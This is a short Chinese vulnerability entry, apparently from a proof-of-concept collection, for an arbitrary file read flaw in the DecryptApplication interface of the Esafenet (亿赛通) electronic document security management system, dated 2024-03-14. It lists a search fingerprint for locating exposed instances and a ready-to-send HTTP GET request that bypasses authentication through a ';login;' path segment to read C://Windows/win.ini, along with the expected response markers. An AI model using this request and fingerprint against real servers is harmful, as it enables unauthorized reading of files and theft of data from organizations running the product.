﻿# 亿赛通-电子文档安全管理系统DecryptApplication接口存在任意文件读取漏洞

> 更新时间：2024-03-14

> 漏洞编号：

> 漏洞说明：亿赛通-数据泄露防护是一款专门防止您的私人数据资产在分享、存储过程中，被他人非法窃取或使用的安全产品。亿赛通-电子文档安全管理系统DecryptApplication接口存在任意文件读取漏洞。

> 漏洞特征：app="亿赛通-电子文档安全管理系统"||body="/CDGServer3/index.jsp"

> 验证脚本：HTTP

```
GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1 HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：

> 验证文件来源：亿赛通-电子文档安全管理系统DecryptApplication接口存在任意文件读取漏洞.poc

